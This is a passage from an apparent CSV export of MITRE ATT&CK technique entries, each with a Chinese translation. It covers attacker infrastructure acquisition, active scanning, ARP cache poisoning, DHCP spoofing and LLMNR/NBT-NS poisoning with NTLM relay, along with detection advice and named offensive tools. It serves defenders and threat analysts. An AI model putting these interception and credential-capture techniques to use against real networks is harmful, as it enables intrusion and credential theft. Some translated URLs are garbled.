Once acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",https://attack.mitre.org/techniques/T1583/007,08 July 2022,20 October 2022,1.0,Resource Development,,PRE,Internet Scan: Response Content,True,T1583,,Awake Security,,,,,,,",",获取基础架构：无服务器,攻击者可能会购买和配置可在定位期间使用的无服务器云基础设施，例如 Cloudflare Workers 或 AWS Lambda 函数。通过利用无服务器基础设施，攻击者可以更难将操作期间使用的基础设施归咎于他们。一旦获得，无服务器运行时环境可以用来直接响应受感染的机器或 [代理]（https://attack.mitre.org/techniques/T1090）流量到攻击者拥有的命令和控制服务器。（引文: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector) 由于这些函数生成的流量似乎来自常见云提供商的子域，因此可能难以区分来自这些提供商的普通流量。（Citation: Detecting Command & Control在云端）（引用：BlackWater Malware Cloudflare Workers）
T1583.003,Acquire Infrastructure: Virtual Private Server,"Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.

Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)",https://attack.mitre.org/techniques/T1583/003,01 October 2020,17 October 2021,1.1,Resource Development,"Once adversaries have provisioned a VPS (ex: for use as a command and control server), internet scans may reveal servers that adversaries have acquired. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,"Internet Scan: Response Content, Internet Scan: Response Metadata",True,T1583,,,,,,,,,"(Citation: FireEye TRITON 2019),(Citation: Novetta-Axiom),(Citation: Microsoft HAFNIUM March 2020),(Citation: Gigamon Berserk Bear October 2021),(Citation: MSTIC DEV-0537 Mar 2022),",获取基础架构：虚拟专用服务器,攻击者可能会租用可在定位期间使用的虚拟专用服务器 (VPS)。存在各种将虚拟机/容器作为服务出售的云服务提供商。通过使用 VPS，攻击者很难在物理上将操作与他们联系起来。云基础设施的使用还可以使攻击者更容易快速配置、修改和关闭他们的基础设施。获取 VPS 用于攻击者生命周期的后期阶段，例如指挥和控制，可以让攻击者受益于与更高声誉的云服务提供商相关的普遍性和信任。攻击者还可能从 VPS 服务提供商处获取基础设施，这些服务提供商以租用具有最少注册信息的 VPS 而闻名，从而允许更匿名地收购基础设施。（引用：TrendmicroHideoutsLease）
T1583.006,Acquire Infrastructure: Web Services,"Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567). Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",https://attack.mitre.org/techniques/T1583/006,01 October 2020,17 October 2021,1.1,Resource Development,"Once adversaries leverage the web service as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known.(Citation: ThreatConnect Infrastructure Dec 2020)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567).",PRE,Internet Scan: Response Content,True,T1583,,,,,,,,,"(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: TrendMicro Confucius APT Feb 2018),(Citation: McAfee Sharpshooter December 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: HackerNews IndigoZebra July 2021),(Citation: Google Election Threats October 2020),(Citation: Microsoft POLONIUM June 2022),(Citation: Volexity Ocean Lotus November 2020),(Citation: ESET Crutch December 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: FireEye APT17),(Citation: Check Point APT35 CharmPower January 2022),(Citation: CISA AppleJeus Feb 2021),(Citation: Anomali Static Kitten February 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: MSTIC NOBELIUM May 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: Microsoft HAFNIUM March 2020),(Citation: FireEye APT29),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: Checkpoint IndigoZebra July 2021),",获取基础架构：Web 服务,攻击者可能会注册可在定位期间使用的 Web 服务。存在各种流行的网站供攻击者注册基于 Web 的服务，这些服务可以在攻击者生命周期的后期阶段被滥用，例如在命令和控制期间（[Web 服务]（https://attack.mitre.org/技术/T1102)) 或 [通过 Web 服务进行渗透](https://attack.mitre.org/techniques/T1567)。使用通用服务，例如谷歌或推特提供的服务，可以让对手更容易隐藏在预期的噪音中。通过利用 Web 服务，攻击者很难将操作与他们进行物理绑定。
T1595,Active Scanning,"Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.

Adversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.(Citation: Botnet Scan)(Citation: OWASP Fingerprinting) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",https://attack.mitre.org/techniques/T1595,02 October 2020,08 March 2022,1.0,Reconnaissance,"Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,,,,,,,,",",主动扫描,对手可能会执行主动侦察扫描以收集可在定位期间使用的信息。主动扫描是对手通过网络流量探测受害者基础设施的扫描，而不是其他不涉及直接交互的侦察形式。攻击者可能会根据他们寻求收集的信息执行不同形式的主动扫描。这些扫描还可以通过各种方式执行，包括使用网络协议的本机功能，例如 ICMP。（引文：僵尸网络扫描）（引文：OWASP 指纹识别）来自这些扫描的信息可能会揭示其他形式的侦察机会（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593) 或 [搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)），建立运营资源（例如： [开发能力](https://attack.mitre.org/techniques/T1587) 或 [获得能力](https://attack.mitre.org/techniques/T1588))，和/或初始访问权限（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133) 或[利用面向公众的应用程序](https://attack.mitre.org/techniques/T1190))。
T1595.001,Active Scanning: Scanning IP Blocks,"Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.

Adversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.(Citation: Botnet Scan) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1595/001,02 October 2020,15 April 2021,1.0,Reconnaissance,"Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet).

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,Network Traffic: Network Traffic Flow,True,T1595,,,,,,,,,"(Citation: Trend Micro TeamTNT),",主动扫描：扫描 IP 块,攻击者可能会扫描受害者 IP 块以收集可在定位期间使用的信息。公共 IP 地址可以按块或一系列连续地址分配给组织。攻击者可能会扫描 IP 块以 [收集受害者网络信息](https://attack.mitre.org/techniques/T1590)，例如正在使用的 IP 地址以及分配这些地址的主机的更详细信息.扫描范围可以从简单的 ping（ICMP 请求和响应）到更细微的扫描，这些扫描可能会通过服务器横幅或其他网络工件揭示主机软件/版本。（引文：僵尸网络扫描）来自这些扫描的信息可能会揭示其他形式的侦察机会（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593) 或[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596))，建立可操作性资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587) 或[获得能力](https://attack.mitre.org/techniques/T1588)）和/或初始访问权限（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133)）。
T1595.002,Active Scanning: Vulnerability Scanning,"Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.

These scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",https://attack.mitre.org/techniques/T1595/002,02 October 2020,15 April 2021,1.0,Reconnaissance,"Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1595,,,,,,,,,"(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: TrendMicro Pawn Storm 2019),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: Trend Micro TeamTNT),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Check Point APT35 CharmPower January 2022),",主动扫描：漏洞扫描,攻击者可能会扫描受害者以查找可在定位期间使用的漏洞。漏洞扫描通常检查目标主机/应用程序的配置（例如：软件和版本）是否可能与攻击者可能寻求使用的特定漏洞的目标一致。这些扫描还可能包括更广泛的 [收集受害者主机信息](https://attack.mitre.org/techniques/T1592) 尝试，可用于识别更常见的可利用漏洞。漏洞扫描通常通过服务器横幅、侦听端口或其他网络工件收集正在运行的软件和版本号。（引用：OWASP Vuln Scanning）来自这些扫描的信息可能会揭示其他形式的侦察机会（例如：[搜索开放网站/域] （https://attack.mitre.org/techniques/T1593）或[搜索开放技术数据库]（https://attack.mitre.org/techniques/T1596）），建立运营资源（例如：[开发能力]（ https://attack.mitre.org/techniques/T1587）或[获得能力]（https://attack.mitre.org/techniques/T1588））和/或初始访问（例如：[利用面向公众的应用程序） ]（https://attack.mitre.org/techniques/T1190））。
T1595.003,Active Scanning: Wordlist Scanning,"Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to [Brute Force](https://attack.mitre.org/techniques/T1110), its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591), or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).

For example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website’s pages and directories.(Citation: ClearSky Lebanese Cedar Jan 2021) This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)).  

As cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.(Citation: S3Recon GitHub)(Citation: GCPBucketBrute) Once storage objects are discovered, adversaries may leverage [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530) to access valuable information that can be exfiltrated or used to escalate privileges and move laterally. ",https://attack.mitre.org/techniques/T1595/003,04 March 2022,15 April 2022,1.0,Reconnaissance,"Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Monitor for access to S3 buckets, especially those that are not intended to be publicly accessible. 

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. 

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,Network Traffic: Network Traffic Content,True,T1595,,"Elvis Veliz, Citi; Jan Petrov, Citi; Richard Julian, Citi",,,,,,,"(Citation: ClearSky Lebanese Cedar Jan 2021),",主动扫描：词表扫描,攻击者可能会使用暴力破解和爬行技术迭代地探测基础设施。虽然该技术采用与 [Brute Force](https://attack.mitre.org/techniques/T1110) 类似的方法，但其目标是识别内容和基础设施，而不是发现有效凭证。这些扫描中使用的词汇表可能包含通用的、常用的名称和文件扩展名或特定于特定软件的术语。攻击者还可以使用从其他侦察技术收集的数据（例如：[收集受害者组织信息](https://attack.mitre.org/techniques/T1591) 或 [搜索受害者拥有的网站]）创建自定义的、特定于目标的词表（https://attack.mitre.org/techniques/T1594））。例如，攻击者可能会使用 Web 内容发现工具（例如 Dirb、DirBuster 和 GoBuster）以及通用或自定义词汇表来枚举网站的页面和目录。（引用：ClearSky Lebanese Cedar Jan 2021）这可以帮助他们发现旧的、易受攻击的页面或可能成为进一步操作目标的隐藏管理门户（例如：[Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) 或 [Brute Force](https://attack.mitre .org/techniques/T1110))。由于云存储解决方案通常使用全球唯一的名称，因此攻击者也可能使用特定于目标的词表和工具，例如 s3recon 和 GCPBucketBrute 来枚举云基础设施上的公共和私有存储桶。（引用：S3Recon GitHub）（引用：GCPBucketBrute）发现后，攻击者可能会利用 [来自云存储的数据](https://attack.mitre.org/techniques/T1530) 访问有价值的信息，这些信息可能会被泄露或用于提升权限和横向移动。
T1557,Adversary-in-the-Middle,"Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)

For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials and session cookies.(Citation: volexity_0day_sophos_FW) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)

Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",https://attack.mitre.org/techniques/T1557,11 February 2020,19 October 2022,2.2,"Collection, Credential Access",Monitor network traffic for anomalies associated with known AiTM behavior. Consider monitoring for modifications to system configuration files involved in shaping network traffic flow.,"Linux, Network, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Service: Service Creation, Windows Registry: Windows Registry Key Modification",False,,,"Daniil Yugoslavskiy, @yugoslavskiy, Atomic Threat Coverage project; Mayuresh Dani, Qualys; NEC",,,,CAPEC-94,,,"(Citation: objsee mac malware 2017),(Citation: CISA AA20-301A Kimsuky),(Citation: CheckPoint Dok),",中间人攻击,攻击者可能会尝试使用中间攻击 (AiTM) 技术将自己定位在两个或多个联网设备之间，以支持后续行为，例如 [网络嗅探](https://attack.mitre.org/techniques/ T1040) 或 [传输数据操作](https://attack.mitre.org/techniques/T1565/002)。通过滥用可以确定网络流量（例如 ARP、DNS、LLMNR 等）的常见网络协议的功能，攻击者可能会强制设备通过攻击者控制的系统进行通信，以便他们可以收集信息或执行其他操作。（引用：Rapid7 MiTM Basics）例如，攻击者可能会操纵受害者 DNS 设置以启用其他恶意活动，例如阻止/重定向用户访问合法站点和/或推送其他恶意软件。（引用：ttint_rat）（引用：dns_changer_trojans）（引用： ad_blocker_with_miner) 攻击者也可以操纵 DNS 并利用他们的位置来拦截用户凭据和会话 cookie。(引用: volexity_0day_sophos_FW) [降级攻击](https://attack.mitre.org/techniques/T1562/010)s 也可以用于建立 AiTM 立场，例如通过协商较不安全、已弃用或较弱版本的通信协议 (SSL/TLS) 或加密算法。（引文n: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att) 攻击者还可以利用 AiTM 的位置来尝试监控和/或修改流量，例如在 [Transmitted Data Manipulation](https://attack.mitre.org/技术/T1565/002）。攻击者可以设置类似于 AiTM 的位置，以防止流量流向适当的目的地，可能会 [Impair Defenses](https://attack.mitre.org/techniques/T1562) 和/或支持 [Network Denial of服务](https://attack.mitre.org/techniques/T1498)。
T1557.002,Adversary-in-the-Middle: ARP Cache Poisoning,"Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).

The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.

An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.

The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)

Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)
",https://attack.mitre.org/techniques/T1557/002,15 October 2020,22 July 2022,1.1,"Collection, Credential Access","Monitor network traffic for unusual ARP traffic, gratuitous ARP replies may be suspicious. 

Consider collecting changes to ARP caches across endpoints for signs of ARP poisoning. For example, if multiple IP addresses map to a single MAC address, this could be an indicator that the ARP cache has been poisoned.","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1557,,"Jon Sternstein, Stern Security",,,,,,,"(Citation: Cylance Cleaver),(Citation: Cisco ARP Poisoning Mitigation 2016),(Citation: Juniper DAI 2020)",中间人攻击：ARP 缓存中毒,攻击者可能会毒化地址解析协议 (ARP) 缓存，以将自己定位在两个或多个联网设备的通信之间。此活动可用于启用后续行为，例如 [Network Sniffing](https://attack.mitre.org/techniques/T1040) 或 [Transmitted Data Manipulation](https://attack.mitre.org/techniques) /T1565/002)。 ARP 协议用于将 IPv4 地址解析为链路层地址，例如媒体访问控制 (MAC) 地址。（引用：RFC826 ARP） 本地网段中的设备之间通过链路层地址进行通信。如果联网设备没有特定联网设备的链路层地址，它可能会向本地网络发送广播 ARP 请求，将 IP 地址转换为 MAC 地址。具有关联 IP 地址的设备直接回复其 MAC 地址。发出 ARP 请求的联网设备将使用该信息并将其存储在其 ARP 缓存中。攻击者可能会被动地等待 ARP 请求来毒化请求设备的 ARP 缓存。攻击者可能会回复他们的 MAC 地址，从而通过让受害者相信他们正在与预期的联网设备进行通信来欺骗受害者。对于攻击 ARP 缓存的攻击者，他们的回复必须比合法 IP 地址所有者做出的回复更快。攻击者还可能向本地网段中的所有设备发送恶意的 ARP 回复，恶意宣布特定 IP 地址的所有权。 ARP 协议是无状态的，不需要认证。因此，设备可能会错误地在其 ARP 缓存中添加或更新 IP 地址的 MAC 地址。（引用：Sans ARP Spoofing Aug 2003）（引用：Cylance Cleaver）攻击者可能使用 ARP 缓存中毒作为拦截网络流量的手段。此活动可用于收集和/或中继数据，例如凭据，尤其是通过不安全、未加密协议发送的数据。（引用：Sans ARP Spoofing Aug 2003）
T1557.003,Adversary-in-the-Middle: DHCP Spoofing,"Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).

DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: 

1. The client broadcasts a `DISCOVER` message.

2. The server responds with an `OFFER` message, which includes an available network address. 

3. The client broadcasts a `REQUEST` message, which includes the network address offered. 

4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.

Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.

DHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.

Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool. ",https://attack.mitre.org/techniques/T1557/003,24 March 2022,21 October 2022,1.1,"Collection, Credential Access","Monitor network traffic for suspicious/malicious behavior involving DHCP, such as changes in DNS and/or gateway parameters. Additionally, monitor Windows logs for Event IDs (EIDs) 1341, 1342, 1020 and 1063, which specify that the IP allocations are low or have run out; these EIDs may indicate a denial of service attack.(Citation: dhcp_serv_op_events)(Citation: solution_monitor_dhcp_scopes)","Linux, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1557,,"Alex Spivakovsky, Pentera; Andrew Allen, @whitehat_zero",,,,,,,",(Citation: dhcp_serv_op_events),(Citation: ntlm_relaying_kerberos_del)",中间人攻击：DHCP 欺骗,攻击者可以通过欺骗动态主机配置协议 (DHCP) 流量并在受害者网络上充当恶意 DHCP 服务器，将网络流量重定向到攻击者拥有的系统。通过达到中间对手 (AiTM) 的位置，对手可以收集网络通信，包括传递的凭据，尤其是那些通过不安全、未加密的协议发送的凭据。这也可能会启用后续行为，例如 [Network Sniffing](https://attack.mitre.org/techniques/T1040) 或 [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/ 002)。 DHCP 基于客户端-服务器模型，具有两个功能：从 DHCP 服务器向客户端提供网络配置设置的协议和向客户端分配网络地址的机制。（引用：rfc2131）典型的服务器-客户端交互是如下： 1. 客户端广播一条`DISCOVER`消息。 2. 服务器以“OFFER”消息响应，其中包括可用的网络地址。 3. 客户端广播一条“REQUEST”消息，其中包括提供的网络地址。 4. 服务器以“ACK”消息确认，客户端接收网络配置参数。攻击者可能会在受害者网络上伪装成流氓 DHCP 服务器，合法主机可能会从中接收恶意网络配置。例如，恶意软件可以充当 DHCP 服务器，并为受害计算机提供攻击者拥有的 DNS 服务器。（引用：new_rogue_DHCP_serv_malware）（引用：w32.tidserv.g）通过恶意网络配置，攻击者可以达到 AiTM 的位置，通过对手控制的系统路由客户端流量，并从客户端网络收集信息。通过向 <code>All_DHCP_Relay_Agents_and_Servers</code> 多播地址发送 <code>INFORMATION-REQUEST (code 11)</code> 消息，DHCPv6 客户端无需分配 IP 地址即可接收网络配置信息。（引用：rfc3315）对手可能会使用他们的恶意 DHCP 服务器来响应带有恶意网络配置的请求消息。除了建立 AiTM 位置外，攻击者还可以通过生成许多广播 DISCOVER 来滥用 DHCP 欺骗来执行 DHCP 耗尽攻击（即 [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)）消息以耗尽网络的 DHCP 分配池。
T1557.001,Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay,"By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. 

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)

Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.

In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. 

Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)",https://attack.mitre.org/techniques/T1557/001,11 February 2020,18 October 2022,1.3,"Collection, Credential Access","Monitor <code>HKLM\Software\Policies\Microsoft\Windows NT\DNSClient</code> for changes to the ""EnableMulticast"" DWORD value. A value of “0” indicates LLMNR is disabled. (Citation: Sternsecurity LLMNR-NBTNS)

Monitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.

